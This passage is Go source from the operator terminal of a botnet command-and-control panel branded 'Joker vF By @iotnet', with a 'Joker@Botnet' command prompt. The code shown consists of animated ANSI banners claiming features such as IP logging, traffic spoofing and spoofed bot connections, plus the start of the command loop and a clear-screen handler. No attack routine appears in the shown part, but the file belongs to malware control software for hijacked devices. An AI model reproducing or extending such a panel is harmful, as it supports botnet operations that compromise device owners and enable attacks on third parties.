            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31mCLEAR!\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n")) 
        time.Sleep(2000 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))           
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╚════════════════════════════════════════╝\r\n"))
    for {  
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;35m[\x1b[1;32mJoker@Botnet\x1b[1;35m]~\x1b[1;32m# \x1b[1;35m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "LOGOUT" || cmd == "logout" {
            return
        }
        if cmd == "" {
            continue
        }


/*
╔

═

╗

║

╚

═

╝

╠╣ 
 ╦ didnt even mean to do that ;)
 ╩
*/
        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
